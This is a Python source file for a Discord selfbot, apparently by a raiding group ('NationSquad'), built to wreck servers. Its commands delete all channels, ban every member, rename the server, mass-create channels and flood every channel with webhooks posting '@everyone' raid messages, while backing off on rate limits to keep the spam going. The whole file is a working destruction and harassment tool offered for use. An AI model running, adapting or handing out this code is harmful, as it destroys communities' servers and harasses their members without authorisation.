import discord
from discord.ext import commands
import asyncio
import requests
import asyncio
from websocket import WebSocket
from concurrent.futures import ThreadPoolExecutor
from json import loads, dumps, load
import random, discord, threading, os, datetime, asyncio
from time import sleep
from colorama import Fore, Back, Style
from discord.ext import (
    commands,
)


color = 0x003240
under = "\n\n\n\n\n\n"
space = "                          "
token = ("")
prefix = (".")
userid = ("")

content = ("discord.gg/Nationsquad domados by NationSquad @everyone ")
description = ("servidor jodido por zNetDev")
image_url = ("https://cdn.discordapp.com/attachments/1209711995264442419/1210040684191551579/PwnedByNationSquad.gif?ex=65e91d34&is=65d6a834&hm=1fe43728007ac2d3066d04161813a6f77861fc2e7de391c33c9b4f44093651e3&")
webhook_name = ("nationsquad bitches")
webhook_title = ("nationsquad is here!!!")
time = datetime.datetime.utcnow()
title_url = ("https://cdn.discordapp.com/attachments/1209651239571427368/1210041049800642560/fwD8kklm_400x400-1.jpg?ex=65e91d8b&is=65d6a88b&hm=b90aed61ae160071aac6d0cb7adf973001b7790a8302cb65aefe4f4bfcfa3fd7&")
icon_url = ("https://cdn.discordapp.com/attachments/1209651239571427368/1210041049800642560/fwD8kklm_400x400-1.jpg?ex=65e91d8b&is=65d6a88b&hm=b90aed61ae160071aac6d0cb7adf973001b7790a8302cb65aefe4f4bfcfa3fd7&")
avatar_url = ("https://cdn.discordapp.com/attachments/1209711995264442419/1210040684191551579/PwnedByNationSquad.gif?ex=65e91d34&is=65d6a834&hm=1fe43728007ac2d3066d04161813a6f77861fc2e7de391c33c9b4f44093651e3&")
footer = ("servidor jodido por zNetDev #nationsquad")


intents = discord.Intents.default()
intents.presences = True
intents.members = True
bot = discord.Client()
bot = commands.Bot(
    description='Selfbot',
    command_prefix=prefix,
    self_bot=True
)    

bot.remove_command('help')

def newpage():
    os.system("mode con: cols=70 lines=40")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
                         (      ( (  (    (        
                        ()) (   )\)\ ))\  )\       
                       ((_)))\ ((_)_)((_)((_)      
                      (/ __|( )| || | '_ \ |_      
                      {Fore.BLACK}{Style.BRIGHT}| (__| '_|\_. | .__/  _|{Style.RESET_ALL}{Fore.RESET}     
                      {Fore.RED} \___|_|  |__/|_|   \__|{Fore.RESET}


     {space}{prefix}help  
                      {Fore.RED}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Fore.RESET}
                       Credits: Gyazo,zNetDev
                       Version: 3.0.0 
                       Prefix: {prefix}
                      {Fore.RED}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Fore.RESET}

                                                                                                                            
""")
    
    
    os.system(f"title gyazo Selfbot v1 ^| Usuario logueado: {bot.user.name}#{bot.user.discriminator} ^| Prefix: {prefix}")

def start():
    bot.run(token, bot=False, reconnect=True)

@bot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CheckFailure):
        pass
    elif isinstance(error, commands.MissingRequiredArgument):
        pass
    elif isinstance(error, discord.errors.Forbidden):
        pass
    elif "Cannot send an empty message" in error_str:
        pass
    else:
        pass

@bot.event
async def on_connect():
    newpage()

def deletechannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v9/channels/{channeldetails}",headers=headers)
    except:
        pass

def textcspam(guild, nameofchan, amount):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        for _ in range(amount):
            requests.post(f"https://canary.discord.com/api/v6/guilds/{guild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass

def webspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:
        randcolor = random.randint(0x4b0cfa, 0x4b0cfa)
        data = {
          "content": f"{content}",
          "embeds": [
            {
              "title": f"{webhook_title}",
              "tts": "true",
              "description": f"\n{description}",
              "url": f"{image_url}",
              "color": f"{randcolor}",
              "timestamp": f"{time}",
              "author": {
                "name": f"{webhook_name}",
                "url": f"{title_url}",
                "icon_url": f"{icon_url}"
              },
              "footer": {
                "text": f"{footer}",
                "icon_url": f"{icon_url}"
              },
              "image": {
                "url": f"{image_url}"
              }
            }
          ],
          "username": f"{webhook_name}",
          "avatar_url": f"{avatar_url}"
        }
        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass
        elif "rate limited" in spammingerror.lower():
            try:
                j = loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                sleep(delay)
        else:
            delay = random.randint(30, 60)
            sleep(delay)

@bot.command()
async def rename(ctx, *, new_name):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.edit(name=new_name)
        except:
            pass

@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@bot.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass

@bot.command()
async def streaming(ctx, *, message):
    await ctx.message.delete()
    
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/bloodyselfbot", 
    )
    
    await bot.change_presence(activity=stream)

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
        try:
            threading.Thread(target = deletechannel, args = (chan.id,)).start() 
        except:
            pass

@bot.command()
async def chspam(ctx, amount: int, *, channel_name: str):
    await ctx.message.delete()
    threading.Thread(target=textcspam, args=(ctx.guild.id, channel_name, amount)).start()
            
@bot.command()
async def webhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = webspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            webhook =await channel.create_webhook(name=f"{str(webhook_name)}")
            threading.Thread(target = webspam, args = (webhook.url,)).start()

@bot.command()
async def crr(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.WHITE}Creating Channels...")
  for i in range(10):
    await ctx.guild.create_text_channel(name=f'Hacked antiplague')
    print(f"{Fore.RED}Creating {channel.name}")


@bot.command()
async def destroy(ctx, *, name):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            threading.Thread(target = deletechannel, args = (channel.id,)).start() 
        except:
            pass
    try:
        await ctx.guild.edit(
            name=name,
            description=".",
            reason=".",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(int(20)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,name,)).start()

@bot.command()
async def stopwebhook(ctx):
    await ctx.message.delete()
    global spammingdawebhookeroos
    spammingdawebhookeroos = False

@bot.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    if ctx.guild == None:
        pass
    else:
        servername = ctx.guild.name
        servercreateat = ctx.guild.created_at.strftime("%a, %d %b %Y %I:%M %p")
        serverid = ctx.guild.id
        serverregion = ctx.guild.region
        boostlevel = ctx.guild.premium_tier
        boostcount = ctx.guild.premium_subscription_count
        rolecount = len(ctx.guild.roles)
        categorycount = len(ctx.guild.categories)
        textchancount = len(ctx.guild.text_channels)
        voicechancount = len(ctx.guild.voice_channels)
        totalmember = ctx.guild.member_count
        message = (f"""
                    {Fore.RED}S{Style.BRIGHT}{Fore.RED}ervername {Fore.LIGHTWHITE_EX}: {Fore.WHITE}{servername}
                    {Fore.WHITE}create at {Fore.LIGHTWHITE_EX}: {Fore.WHITE}{servercreateat}
                    {Fore.WHITE}server id {Fore.LIGHTWHITE_EX}: {Fore.WHITE}{serverid}
                    {Fore.WHITE}server region {Fore.LIGHTWHITE_EX}: {Fore.WHITE}{serverregion}
                    {Fore.WHITE}boost level {Fore.LIGHTWHITE_EX}: {Fore.RED}{boostlevel} {Fore.WHITE}level 
                    {Fore.WHITE}boost count {Fore.LIGHTWHITE_EX}: {Fore.RED}{boostcount} {Fore.WHITE}boost
                    {Fore.WHITE}role count {Fore.LIGHTWHITE_EX}: {Fore.RED}{rolecount} {Fore.WHITE}roles
                    {Fore.WHITE}category count {Fore.LIGHTWHITE_EX}: {Fore.RED}{categorycount} {Fore.WHITE}category
                    {Fore.WHITE}text channel count {Fore.LIGHTWHITE_EX}: {Fore.RED}{textchancount} {Fore.WHITE}channels
                    {Fore.WHITE}voice channel count {Fore.LIGHTWHITE_EX}: {Fore.RED}{voicechancount} {Fore.WHITE}channels
                    {Fore.WHITE}total member {Fore.LIGHTWHITE_EX}: {Fore.RED}{totalmember} {Fore.WHITE}people
""")
        newpage()
        print(message)




@bot.command()
async def cls(ctx):
    await ctx.message.delete()
    newpage()
    
@bot.command()
async def help(ctx ,page=None):
    await ctx.message.delete()
    help = f"""                                         
                    {Fore.RED} ____________________________  
                    {Fore.RED}|                            |                
                    {Fore.RED}|{Fore.WHITE}{prefix}chspam (amount)(name)    {Fore.LIGHTWHITE_EX}  {Fore.RED}| 
                    {Fore.RED}|{Fore.WHITE}{prefix}rename (name)            {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}rolespam (amount)(name)  {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}streaming (name)         {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}delroles                 {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}webhookspam              {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}stopwebhook              {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}destroy (name)           {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}serverinfo               {Fore.LIGHTWHITE_EX}  {Fore.RED}|     
                    {Fore.RED}|{Fore.WHITE}{prefix}delchannels              {Fore.LIGHTWHITE_EX}  {Fore.RED}| 
                    {Fore.RED}|{Fore.WHITE}{prefix}purge (amount)           {Fore.LIGHTWHITE_EX}  {Fore.RED}|
                    {Fore.RED}|{Fore.WHITE}{prefix}banall                   {Fore.LIGHTWHITE_EX}  {Fore.RED}|
                    {Fore.RED}|____________________________| """                               
    if page == None:
        newpage()
        print(help)
    elif page == ("1"):
        newpage()
        print(help)

start()
